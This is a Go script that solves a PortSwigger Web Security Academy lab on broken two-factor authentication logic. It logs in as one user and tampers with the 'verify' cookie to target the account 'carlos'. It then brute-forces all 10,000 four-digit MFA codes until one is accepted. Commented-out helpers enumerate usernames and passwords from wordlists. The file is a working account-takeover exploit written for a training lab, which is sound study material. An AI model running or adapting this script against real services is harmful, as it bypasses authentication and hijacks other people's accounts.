// https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic

package main

import (
	//"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	//"os"
	//"regexp"
	"strings"
)

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	client, err := newClient()
	if err != nil {
		return err
	}

	u := "https://0adb005a03204e01c1c452d300490007.web-security-academy.net"
	loginUrl := u + "/login"
	loginUrl2 := u + "/login2"


	username := "wiener"
	password := "peter"
	status, _, err := login(loginUrl, username, password, client)
	if err != nil {
		return err
	}
	fmt.Println("Login: status %v", status)

	cname := "verify"
	cval := "carlos"
	fmt.Printf("Set %v cookie to %v\n", cname, cval)
	err = setCookie(client, loginUrl, cname, cval)
	if err != nil {
		return err
	}

	fmt.Println("GET " + loginUrl2)
	_, err = client.Get(loginUrl2)
	if err != nil {
		return err
	}


	status, _, err = login(loginUrl, username, password, client)
	if err != nil {
		return err
	}
	fmt.Println("Login: status %v", status)


	fmt.Printf("Set %v cookie to %v\n", cname, cval)
	err = setCookie(client, loginUrl, cname, cval)
	if err != nil {
		return err
	}

	for i:=0; i<10000; i++ {
		code := fmt.Sprintf("%04d", i)
		_, body, err := postCode(loginUrl2, code, client)
		if err != nil {
			return err
		}
		if !strings.Contains(body, "Incorrect security code") {
			break
		}
	}

	fmt.Println("Done")
	return nil
}

func setCookie(client *http.Client, us, name, value string) error {
	u, err := url.Parse(us)
	if err != nil {
		return err
	}
	c := &http.Cookie{Name: name, Value: value}
	client.Jar.SetCookies(u, []*http.Cookie{c})
	return nil
}

/*
func username(u string, client *http.Client) (string, error) {
	f, err := os.Open("usernames.txt")
	if err != nil {
		return "", err
	}
	defer f.Close()

	sc := bufio.NewScanner(f)
	for sc.Scan() {
		username := sc.Text()
		fmt.Println(username)
		body, err := login(u, username, "123456", client)
		if err != nil {
			return "", err
		}
		if !strings.Contains(body, "Invalid username") {
			return username, nil
		}
	}
	return "", fmt.Errorf("username not found")
}

func password(u, username string, client *http.Client) (string, error) {
	f, err := os.Open("passwords.txt")
	if err != nil {
		return "", err
	}
	defer f.Close()

	sc := bufio.NewScanner(f)
	for sc.Scan() {
		password := sc.Text()
		fmt.Println(password)
		body, err := login(u, username, password, client)
		if err != nil {
			return "", err
		}
		if !strings.Contains(body, "Incorrect password") {
			return password, nil
		}
	}
	return "", fmt.Errorf("password not found")
}

var warnRE *regexp.Regexp = regexp.MustCompile(`<p .*is-warning.*>.*</p>`)
*/

func login(u, username, password string, client *http.Client) (int, string, error) {
	resp, err := client.PostForm(u, url.Values{"username": {username}, "password": {password}})
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	//if resp.StatusCode/100 == 4 || resp.StatusCode/100 == 5 {
	//	return "", fmt.Errorf("%v", resp.Status)
	//}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", err
	}

	return resp.StatusCode, string(body), nil
}

func postCode(u, code string, client *http.Client) (int, string, error) {
	fmt.Printf("Post code %v\n", code)
	resp, err := client.PostForm(u, url.Values{"mfa-code": {code}})
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	//if resp.StatusCode/100 == 4 || resp.StatusCode/100 == 5 {
	//	return "", fmt.Errorf("%v", resp.Status)
	//}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", err
	}

	return resp.StatusCode, string(body), nil
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	return &http.Client{Jar: jar}, nil
}


